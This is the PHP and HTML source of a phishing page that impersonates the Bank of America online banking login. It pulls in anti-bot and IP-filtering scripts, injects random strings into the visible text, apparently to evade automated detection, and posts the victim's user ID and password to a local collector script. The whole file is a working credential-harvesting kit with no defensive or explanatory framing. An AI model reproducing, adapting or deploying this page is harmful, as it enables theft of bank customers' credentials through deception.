<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-95 webkit svg-bg not-retina cf-cnx-regular-inactive"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('mm/cnx-regular.eot'); src: url('mm/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style>



		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Log In</title>
	
	

    <link rel="shortcut icon" href="bstyles/favicon.ico?ts=20151018" type="image/x-icon">
					<link rel="stylesheet" type="text/css" href="bstyles/vipaa-v4-jawr.css" media="all">
					<link rel="stylesheet" type="text/css" href="bstyles/vipaa-v4-jawr-print.css" media="print"><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style>
				<style>body{display:none;}</style>
				
				</head>		
	<body class="fsd-layout-body" style="display: block;">	

				<noscript><style>body{display:block;}</style></noscript>
					<a class="ada-hidden ada-visible-focus" id="ada-skip-link">Skip <?php echo rT('ALPHANUMERIC',rand(1,87));?>to main content</a>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="bstyles/BofA_rgb.png">
      <div class="page-type cnx-regular" data-font="#!">Log In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En español</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
										<div class="fsd-fauxdal-title">
											Please use JavaScript
										</div>
										<p>You need a web browser that<?php echo rT('ALPHANUMERIC',rand(1,87));?> supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
<p>&nbsp;</p>
<p><a title="Browser Help and Tips" name="Browser Help and Tips" target="_self">Browser Help and Tips</a></p>
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal"><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>


	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
		<h1 data-font="#!" class="cnx-regular">Log In to <?php echo rT('ALPHANUMERIC',rand(1,87));?>Online Banking</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-vipaa-module<?php if(!isset($_GET['LoginFailed']) && !isset($_GET[''.$theerrkey.''])){echo ' hide';}?>" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title TLu_ERROR">Invalid login <?php echo rT('ALPHANUMERIC',rand(1,87));?>credentials.</p>
				<ul></ul>
			</div>
		</div>
	</div>


<div class="vipaa-modal-content-module">
	<div class="sitekey-affinity-skin">
		
	</div>
</div>


</div>
					<div class="columns">
						<div class="flex-col lt-col">
						
<div class="online-id-vipaa-module">
	<div class="enter-skin phoenix">
		<form class="simple-form collector-form-marker" id="EnterOnlineIDForm" method="post" action="v<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" autocomplete="off" novalidate="novalidate">
		  <div class="online-id-section">

			<label for="enterID-input">User <?php echo rT('ALPHANUMERIC',rand(1,87));?>ID<span class="ada-hidden"> Must be at least 6 characters long</span></label>
			<input type="text" id="enterID-input" name="lineId" maxlength="32" value="" autocomplete="off">
					<div class="remember-info">
								<input type="checkbox" id="remID" name="saveMyID">
						<label for="remID">Save this User ID</label>
						
						<div class="clearboth"></div>
					</div>
			</div>
			<label for="tlpvt-passcode-input" class="mtop-15">Password<span class="ada-hidden"> is unavailable. Please enter atleast 6 characters of online id to enable Passcode</span></label>
			<div class="TL_NPI_Pass">
				<input type="password" class="tl-private fl-lt" id="tlpvt-passcode-input" name="passcode" maxlength="20" value="" autocomplete="off">
				<input type="hidden" name="btnlo" value="<?php echo uniqid();?>">
			</div>
					<a class="fl-lt forgot-passcode" name="forgot-your-passcode">Forgot your Password?</a>
			<div class="clearboth"></div>
			<a href="javascript:void(0);" onclick="EnterOnlineIDForm.submit();" title="Log In" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit"><span class="btn-bofa-blue-lock">Log In</span></a>
		
			
		<div class="digital-id-notify phoenix hidden" id="digital-id-success-message">
	<div class="digital-id-head">
    	Check your mobile device
    </div>
	<span class="circle-animation">
          <div class="circle-inline">Loading</div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span></div>
			<div class="clearboth"></div></form>		
	<div id="fpContainer" class="" style="width: 50%;">
	
	</div>
				<!-- Mobile CTA: Borneo version of 'Get the app' widget on the signOnV2 page -->
					<!-- Normal Scenario -->
					<div class="mobile-cta-section vertical-dotted-line fl-rt">
					<p class="cnx-regular title enroll-color-gray mbtm-10">Stay connected<?php echo rT('ALPHANUMERIC',rand(1,87));?> with our app</p>
					<img height="208" width="149" src="bstyles/mobile_llama.png" alt="Mobile banking Llama" class="fl-lt">
					<div class="get-app-content-section">
						<div class="cnx-regular title enroll-color-gray mcta-bubble">Secure, convenient banking anytime</div>
						<a id="choose-device-get-the-app" name="choose-device-get-the-app" class="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="javascript:void(0);" rel="mobile-app-download-choose-device"><span>Get the app</span><span class="ada-hidden">&nbsp; link opens a new info modal layer</span></a>
					</div>
				</div>
	</div>
</div>


		<style type="text/css">
			.aps-mobile-products .sprite .spr {
			background-size: 700px 550px; 
			
		}
		</style>





<div class="mobile-app-download-module hide" id="mobile-app-download-choose-device">
  <div class="choose-device-modal-skin">
	 <h3>Select your device</h3>
	 <div class="flex-modal-main-content">         
	   <p>Please select your device to continue:</p>
		<label for="device-pulldown" class="ada-hidden">Select<?php echo rT('ALPHANUMERIC',rand(1,87));?> your device.  Press TAB to continue after making selection.</label>
		<select id="device-pulldown" name="device-pulldown" class="select-bofa">
				<option value="Select your device">Select your device</option>
				<option value="iPhone">iPhone</option>
				<option value="iPad">iPad</option>
				<option value="Android">Android</option>
				<option value="Other">Other</option>
		</select>				   
	   <div class="clearboth"></div>
			<a href="javascript:void(0);" id="choose-device" class="btn-bofa btn-bofa-red btn-disabled get-app-modal-trigger btn-bofa-noRight" name="choose-device" rel="choose-device-modal">
				Continue<span class="ada-hidden">&nbsp; link opens a new <?php echo rT('ALPHANUMERIC',rand(1,87));?>info modal layer</span>
			</a>
	 </div>
  </div>
</div>
	<style type="text/css">
		.aps-mobile-products .sprite-D5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
		.aps-mobile-products .sprite-J8>.spr {height: 51px;width: 50px !important;background-position: -522px -410px !important;left: 30px !important;}
		.aps-mobile-products .sprite-F5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
	</style>
</div>
						<div class="flex-col rt-col">
	<div class="side-well-vipaa-module">
		<div class="fsd-ll-skin">
		 <h2>Login <?php echo rT('ALPHANUMERIC',rand(1,87));?>help</h2>
			<ul class="li-pbtm-15">
						<li><a class="arrow" name="Forgot ID/Password?">Forgot ID<?php echo rT('ALPHANUMERIC',rand(1,87));?>/Password?</a></li>
						<li><a class="arrow" name="Problem logging in?">Problem logging in?</a></li>
			</ul>
		</div>
		<div class="fsd-ll-skin">
   			<h2>Not using Online Banking?</h2>
            <ul class="li-pbtm-15">
							<li><a class="arrow" name="Enroll_now">Enroll now<span class="ada-hidden">  for online<?php echo rT('ALPHANUMERIC',rand(1,87));?> Banking</span></a></li>
							<li><a class="arrow" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a></li>
							<li><a class="arrow" name="Service_Agreement_dotcom">Service Agreement</a></li>
            </ul>
		</div>
	</div>
</div>
						<div class="clearboth"></div>
					</div>
					<div class="footer">
						<div class="footer-top">&nbsp;	
		
		
		
		
		</div>
						<div class="footer-inner" style="margin-top: 1427px;">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a name="Privacy_&amp;_Security_footer" title="Privacy" target="_blank">Privacy</a>
				
				<a class="last-link" name="Security" title="Security" target="_blank">Security</a>
				<div class="clearboth"></div><?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>
         </div>
      </div>
      <p>Bank of America, N.A. <?php echo rT('ALPHANUMERIC',rand(1,87));?>Member FDIC. <a name="Equal_Housing_Lender" target="_blank">Equal<?php echo rT('ALPHANUMERIC',rand(1,87));?> Housing Lender</a> <br>©&nbsp;<?php echo date("Y");?> Bank of America Corporation.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
		


</body></html>